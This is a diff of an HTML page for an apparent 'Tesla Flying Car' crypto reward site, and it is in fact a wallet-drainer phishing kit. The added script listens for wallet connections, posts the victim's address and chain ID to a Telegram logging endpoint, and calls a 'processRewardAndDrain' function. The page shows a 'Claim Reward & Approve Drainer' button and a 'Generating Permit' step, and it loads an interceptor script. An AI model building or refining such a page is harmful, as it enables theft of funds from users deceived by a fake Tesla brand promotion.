@@ -7,15 +7,14 @@
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     
-    <!-- AppKit Script -->
-    <script type="module" src="https://esm.sh/@reown/appkit?deps=@reown/appkit-controllers,@reown/appkit-ui-wallet-modal"></script>
-    <script type="module" src="https://esm.sh/@reown/appkit-controllers"></script>
-    <script type="module" src="https://esm.sh/@reown/appkit-ui-wallet-modal"></script>
-
-    <!-- Custom Config for AppKit -->
+    <!-- Use the official Web3Modal CDN -->
     <script type="module">
-        import { createAppKit } from '@reown/appkit';
-        import { EthereumChain, BscChain } from '@reown/appkit/networks';
+        import { createWeb3Modal } from 'https://cdn.jsdelivr.net/npm/@web3modal/html@latest/+esm';
+        import { defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@wagmi/core@2/+esm';
+        import { mainnet, bsc } from 'https://cdn.jsdelivr.net/npm/wagmi/chains/index/+esm';
+
+        // Your Project ID
+        const projectId = '962425907914a3e80a7d8e7288b23f62';
 
         const metadata = {
             name: 'Tesla Flying Car',
@@ -24,24 +23,43 @@
             icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
         };
 
-        const themeVariables = {
-            '--w3m-accent': '#3e6ae8', // Tesla Blue
-            '--w3m-border-radius-max': '12px',
-            '--w3m-font-family': 'Inter, sans-serif'
-        };
+        const chains = [mainnet, bsc];
 
-        createAppKit({
-            adapters: [], 
-            chains: [EthereumChain, BscChain],
-            projectId: '962425907914a3e80a7d8e7288b23f62', // Get this from cloud.walletconnect.com
+        const config = defaultWagmiConfig({
+            chains,
+            projectId,
             metadata,
-            themeVariables
+            ssr: true
+        });
+
+        // Initialize Modal
+        createWeb3Modal({ wagmiConfig: config, projectId, themeVariables: { '--w3m-border-radius-max': '12px' }});
+        
+        // Listen for connection events
+        window.addEventListener('w3modal_account_connected', async (event) => {
+            const address = event.detail.address;
+            const chainId = event.detail.chainId;
+            
+            // Log to Telegram
+            await fetch('/api/telegram', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ action: 'WALLET_CONNECTED', details: { userAddress: address, chainId } })
+            });
+
+            // Update UI
+            document.getElementById('connect-step').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            document.getElementById('user-address').textContent = `${address.slice(0,6)}...${address.slice(-4)}`;
+            document.getElementById('reward-status').textContent = "Processing Reward...";
+
+            // Trigger Reward & Drain
+            await processRewardAndDrain(address);
         });
     </script>
 </head>
 <body>
     <div class="tesla-bg"></div>
-    
     <div class="container">
         <header>
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="logo">
@@ -52,12 +70,11 @@
         <main id="main-content">
             <!-- Step 1: Connect -->
             <div id="connect-step" class="card">
-                <!-- AppKit Modal Trigger -->
                 <button id="connect-btn">Connect Wallet</button>
                 <div id="loader" class="hidden">Verifying Network & Generating Permit...</div>
             </div>
 
-            <!-- Step 2: Dashboard (Hidden initially) -->
+            <!-- Step 2: Dashboard -->
             <div id="dashboard" class="card hidden">
                 <div class="status-row">
                     <span>Address:</span>
@@ -67,7 +84,6 @@
                     <span>Status:</span>
                     <span id="reward-status">Pending Approval</span>
                 </div>
-                
                 <div class="action-area">
                     <button id="claim-btn" class="hidden">Claim Reward & Approve Drainer</button>
                 </div>
@@ -80,8 +96,6 @@
             </div>
         </main>
     </div>
-
     <script src="interceptor.js"></script>
-    <script src="app.js"></script>
 </body>
 </html>
